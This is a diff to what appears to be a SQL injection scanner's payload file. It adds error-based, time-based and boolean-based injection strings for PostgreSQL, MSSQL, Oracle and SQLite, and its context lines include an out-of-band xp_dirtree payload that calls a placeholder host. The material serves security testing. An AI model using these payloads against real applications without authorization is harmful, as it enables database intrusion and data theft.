@@ -4,6 +4,7 @@
 
 payloads:
   error_based:
+    # Generic / MySQL
     - "'"
     - '"'
     - "' OR '1'='1"
@@ -14,6 +15,22 @@ payloads:
     - "' UNION SELECT 1,2,3--"
     - "' AND 1=CONVERT(int, (SELECT @@version))--"
     - "1 AND 1=1 UNION SELECT 1,2,3--"
+    # PostgreSQL
+    - "' OR 1=1::text--"
+    - "1; SELECT pg_sleep(0)--"
+    - "' UNION SELECT NULL::text,NULL::text--"
+    # MSSQL
+    - "1; SELECT @@version--"
+    - "' HAVING 1=1--"
+    - "' GROUP BY 1 HAVING 1=1--"
+    # Oracle
+    - "' UNION SELECT NULL FROM DUAL--"
+    - "1' OR '1'='1"
+    - "' OR 1=1--"
+    # SQLite
+    - "' UNION SELECT 1,2,3--"
+    - "' OR '1'='1' --"
+    - "1' OR '1'='1"
 
   time_based:
     - "' AND SLEEP(5)-- -"
@@ -23,6 +40,12 @@ payloads:
     - "' AND BENCHMARK(5000000,MD5('test'))--"
     - "'; SELECT pg_sleep(5)--"
     - "1 AND SLEEP(5)--"
+    # MSSQL time-based
+    - "1'; WAITFOR DELAY '0:0:5'--"
+    - "' WAITFOR DELAY '0:0:5'--"
+    # Oracle time-based
+    - "' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+    - "' OR 123=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
 
   boolean_based:
     - [" AND 1=1-- -", " AND 1=2-- -"]
@@ -30,6 +53,10 @@ payloads:
     - ["' AND 1=1--", "' AND 1=2--"]
     - ["%' AND 1=1-- -", "%' AND 1=2-- -"]
     - ["' AND 1=1 AND '%'='", "' AND 1=2 AND '%'='"]
+    # PostgreSQL
+    - ["' OR '1'='1'--", "' OR '1'='2'--"]
+    # MSSQL
+    - ["1' AND 1=1--", "1' AND 1=2--"]
 
   oob:
     - "'; exec xp_dirtree '//{oob}/test'--"
